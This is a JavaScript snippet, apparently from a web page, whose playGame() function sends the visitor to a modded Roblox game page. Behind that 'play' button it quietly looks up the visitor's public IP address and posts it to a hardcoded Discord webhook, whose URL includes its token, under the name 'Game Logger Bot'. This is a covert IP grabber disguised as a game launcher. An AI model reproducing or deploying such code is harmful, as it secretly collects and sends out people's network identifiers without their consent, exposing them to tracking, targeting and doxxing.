        function playGame() {
            window.location.href = "https://www.roblox.com/games/14302160946/Hood-Stars-Modded-Beta-Release";
            const ipAddress = fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const discordWebhookURL = 'https://discord.com/api/webhooks/1229217799738626089/JiTR6Zs16kbu-RldzJviezcY4u87xY1Mf1BC1n1baG9ivEq2qqYpPlhn07REh7QpzUj0';
                    const payload = {
                        content: `User with IP ${ip} pressed the play button.`,
                        username: 'Game Logger Bot'
                    };
                    fetch(discordWebhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    }).then(response => console.log('IP logged to Discord webhook'))
                      .catch(error => console.error('Error logging IP to Discord webhook:', error));
                })
                .catch(error => console.error('Error getting IP address:', error));
        }
